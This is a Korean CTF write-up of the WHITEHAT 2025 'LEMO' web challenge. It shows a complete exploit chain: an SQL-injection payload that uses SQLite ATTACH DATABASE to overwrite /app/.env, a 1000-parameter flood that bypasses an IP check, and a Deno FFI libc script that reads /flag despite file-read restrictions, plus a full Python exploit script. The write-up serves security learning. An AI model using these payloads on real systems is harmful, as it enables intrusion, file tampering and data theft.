---
title: ["[WHITEHAT 2025 Final CTF- web] LEMO"]
date: 2025-11-21 09:00:00 +0900
last_modified_at: 2025-11-21 09:00:00 +0900
categories: [writeup, ctf]
tags: [web, sqli, parameter, FFI]
---

## 핵심 메커니즘
### 1. Nginx Purify Layer (`purify.js`)
    ```javascript
    function fix(r) {
        var out = [];
        var args = r.args;
        
        for (var k in args) {
            if (k === 'ip')  // 사용자가 보낸 'ip' 파라미터 필터링
                continue;
            out.push(k + '=' + encodeURIComponent(v));
        }
        
        var real_ip = r.variables.remote_addr || "";
        out.push('ip=' + real_ip);  // 실제 클라이언트 IP 강제 추가
        return out.join('&');
    }   
    ```

### 2. Admin Middleware (`/api/admin/_middleware.ts`)
    ```
    export async function handler(req: Request, ctx: FreshContext) {
        ctx.state = ctx.state ?? {};
        const ip = ctx.state.ip;
        const NODE_ENV = Deno.env.get("NODE_ENV") ?? "production";

        if (ip !== "127.0.0.1" || NODE_ENV !== "development") {
            return new Response("403 Forbidden", { status: 403 });
        }

        return await ctx.next();
    }   
    ```

**두 가지 조건을 모두 만족해야 admin 기능이 사용 가능하다.**  
- `ip === "127.0.0.1"`
- `NODE_ENV === "development"`


## 취약점
### 1. SQL Injection
`db.ts`의 `createUser` 함수에서 SQLi 취약점 발견  
```
export function createUser(username: string, password: string, role: Role = Role.USER) {
  const result = db.exec(`INSERT INTO users (username, password, role) VALUES ('${username}', '${password}', ${role})`);
  return result;
}
```

이를 통해 `role=1` (ADMIN) 계정을 생성할 수 있었다.  

### 2. Parameter Bombing으로 IP 검사 우회
Root middleware (`/_middleware.ts`)의 로직을 분석한 결과:  

```
ctx.state.query = await parseQuery(req);  // qs.parse() 사용

if (ctx.state.query.ip) {
    if (typeof ctx.state.query.ip !== "string") {
        return new Response("400 Bad Request", { status: 400 });
    }
    ctx.state.ip = ctx.state.query.ip;
} else {
    ctx.state.ip = "127.0.0.1";  
}
```

1000개 이상의 파라미터를 전송하면, `qs.parse()`가 오버로드되어 `ip` 파라미터를 제대로 파싱하지 못한다.  
하지만, `NODE_ENV` 조건을 우회하는 것에서 막혔다.  
`NODE_ENV`는 서버의 환경변수이기 때문에, HTTP 요청으로 조작할 수 없었다.  

하지만, SQLite의 **ATTACH DATABASE**로 임의의 파일을 데이터베이스로 attach가 가능하다.  
이후 문제를 해결하는데 admin role이 필요가 없다는 점에서, 취약점을 잘못된 방향으로 활용한 셈이다.  

```sql
ATTACH DATABASE '/app/.env' AS env;
CREATE TABLE env.t (data TEXT);
INSERT INTO env.t (data) VALUES ('
NODE_ENV=development
');
```  

이렇게 하면 `/app/.env` 파일이 생성되고, SQLite 데이터베이스 포맷으로 저장되지만, Deno는 기본적으로 이를 파싱해서 환경변수로 설정할 수 있다.  

### 3. Deno Permission
`/_middleware.ts`의 로직을 모두 우회했지만, flag를 읽는 과정에서 한 가지 장애물이 더 있다.  

```
export const handler = async (req: Request): Promise<Response> => {
    const flag = await Deno.readTextFile("/flag");
    return new Response(flag);
};
```
가장 간단한 방식으로 flag 파일을 읽으려 했지만 아래와 같은 에러와 함께 실패하였다.  
```
Error: NotCapable: Requires read access to "/flag", run again with the --allow-read flag
```

`--allow-read` 옵션으로 `/app` 디렉토리만 읽을 수 있었고, `/flag`는 권한 밖이라 불가능했다.  

`readTextFile` 외에도, `cat`, `fs` 모두 실패하였다.  

하지만, `--allow-ffi` 권한이 활성화 되어 있었다.  
FFI를 사용하면 C 라이브러리를 직접 호출할 수 있다.  

```
export const handler = async (req: Request): Promise<Response> => {
    try {
        const libc = Deno.dlopen("/lib/x86_64-linux-gnu/libc.so.6", {
            open: { 
                parameters: ["buffer", "i32"],
                result: "i32"
            },
            read: { 
                parameters: ["i32", "buffer", "usize"],
                result: "isize"
            },
            close: { 
                parameters: ["i32"],
                result: "i32" 
            }
        });
        
        // 1. open("/flag", O_RDONLY)
        const pathBuf = new TextEncoder().encode("/flag\0");
        const fd = libc.symbols.open(pathBuf, 0);
        
        if (fd < 0) {
            libc.close();
            return new Response("Failed to open /flag");
        }
        
        // 2. read(fd, buffer, size)
        const buffer = new Uint8Array(4096);
        const bytesRead = libc.symbols.read(fd, buffer, 4096);
        
        // 3. close(fd)
        libc.symbols.close(fd);
        libc.close();
        
        if (bytesRead <= 0) {
            return new Response("Failed to read");
        }
        
        const flag = new TextDecoder().decode(buffer.slice(0, Number(bytesRead)));
        return new Response(flag);
        
    } catch (e) {
        return new Response("Error: " + e.toString());
    }
};
```

**작동 원리:**
```
Deno Permission Layers:
┌─────────────────────────────────────┐
│   High-Level API (Deno.readFile)    │ ← --allow-read 체크
├─────────────────────────────────────┤
│   Node.js Compat (fs.readFileSync)  │ ← --allow-read 체크
├─────────────────────────────────────┤
│   Command Execution (Deno.Command)  │ ← --allow-run 체크
├─────────────────────────────────────┤
│   FFI (Deno.dlopen)                 │ ← --allow-ffi 체크만
└─────────────────────────────────────┘
         ↓ Direct System Call
┌─────────────────────────────────────┐
│   libc (open, read, write, ...)     │ ← 권한 체크 없음
└─────────────────────────────────────┘
```


## Exploit
```python
import requests

URL = "http://target-server"

requests.post(
    URL + "/api/signup",
    {
        "username": "aaa', '', 1); ATTACH DATABASE '/app/.env' AS env; CREATE TABLE env.t (data TEXT); INSERT INTO env.t (data) VALUES ('\nNODE_ENV=development\n'); ATTACH DATABASE '/app/routes/t' AS dummy; CREATE TABLE dummy.t (d TEXT); --",
        "password": "aaaaa",
        "password_confirm": "aaaaa",
    },
)

with open("./exploit.ts") as f:
    requests.post(
        URL + "/api/admin/save?" + "&".join([f"p{x}=x" for x in range(1000)]),
        {
            "filepath": "api/logout.ts",
            "content": f.read(),
        },
    )

flag = requests.get(URL + "/api/logout").text
print(f"FLAG: {flag}")
```

exploit.ts
```
export const handler = async (req: Request): Promise<Response> => {
    try {
        const libc = Deno.dlopen("/lib/x86_64-linux-gnu/libc.so.6", {
            open: { parameters: ["buffer", "i32"], result: "i32" },
            read: { parameters: ["i32", "buffer", "usize"], result: "isize" },
            close: { parameters: ["i32"], result: "i32" }
        });
        
        const pathBuf = new TextEncoder().encode("/flag\0");
        const fd = libc.symbols.open(pathBuf, 0);
        
        if (fd < 0) {
            libc.close();
            return new Response("Failed to open /flag");
        }
        
        const buffer = new Uint8Array(4096);
        const bytesRead = libc.symbols.read(fd, buffer, 4096);
        libc.symbols.close(fd);
        libc.close();
        
        const flag = new TextDecoder().decode(buffer.slice(0, Number(bytesRead)));
        return new Response(flag);
        
    } catch (e) {
        return new Response("Error: " + e.toString());
    }
};
```

## 삽질의 교훈
취약점이 사용되지 않았다면, 익스플로잇 방향이 틀리지 않았는지 의심하자.  
SQLi의 파급효과는 강력하다.  
LLM을 사용할 때 대화가 길어지면 초반부의 디테일을 놓치기가 쉽다. 핵심적인 내용은 리마인드 해주는 습관을 갖자.  